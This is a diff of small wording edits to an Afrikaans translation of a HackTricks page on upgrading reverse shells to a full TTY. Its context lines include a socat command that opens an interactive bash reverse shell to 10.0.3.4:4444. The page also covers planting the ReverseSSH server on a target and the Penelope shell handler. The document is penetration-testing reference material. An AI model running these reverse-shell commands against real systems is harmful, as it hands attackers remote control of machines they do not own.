@@ -17,7 +17,7 @@ Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 
 ## Volle TTY
 
-Let daarop dat die shell wat jy in die `SHELL` veranderlike stel **moet** wees **gelys binne** _**/etc/shells**_ of `Die waarde vir die SHELL veranderlike is nie in die /etc/shells lêer gevind nie. Hierdie voorval is gerapporteer`. Let ook daarop dat die volgende snippette slegs in bash werk. As jy in 'n zsh is, verander na 'n bash voordat jy die shell verkry deur `bash` te loop.
+Let daarop dat die shell wat jy in die `SHELL` veranderlike stel **moet** **lys wees binne** _**/etc/shells**_ of `Die waarde vir die SHELL veranderlike is nie in die /etc/shells lêer gevind nie. Hierdie voorval is gerapporteer`. Let ook daarop dat die volgende snippette slegs in bash werk. As jy in 'n zsh is, verander na 'n bash voordat jy die shell verkry deur `bash` te loop.
 
 #### Python
 
@@ -69,7 +69,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 'n gerieflike manier vir **interaktiewe skulp toegang**, sowel as **lêer oordragte** en **poort forwarding**, is om die staties-gekoppelde ssh bediener [ReverseSSH](https://github.com/Fahrj/reverse-ssh) op die teiken te plaas.
 
-Hieronder is 'n voorbeeld vir `x86` met upx-gecomprimeerde binêre. Vir ander binêre, kyk [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).
+Hieronder is 'n voorbeeld vir `x86` met upx-gecomprimeerde binêre. Vir ander binêre, kyk na die [vrygawes bladsy](https://github.com/Fahrj/reverse-ssh/releases/latest/).
 
 1. Berei plaaslik voor om die ssh poort forwarding versoek te vang:
 
@@ -114,7 +114,7 @@ sftp -P 8888 127.0.0.1
 ```
 ## Penelope
 
-Penelope (https://github.com/brightio/penelope) werk outomaties Linux reverse shells op na TTY, hanteer die terminalgrootte, log alles en nog baie meer. Dit bied ook readline-ondersteuning vir Windows shells.
+[Penelope](https://github.com/brightio/penelope) werk outomaties Linux reverse shells op na TTY, hanteer die terminalgrootte, log alles en nog baie meer. Dit bied ook readline-ondersteuning vir Windows shells.
 
 ![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)
 
@@ -132,8 +132,8 @@ Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 
 <summary>Ondersteun HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
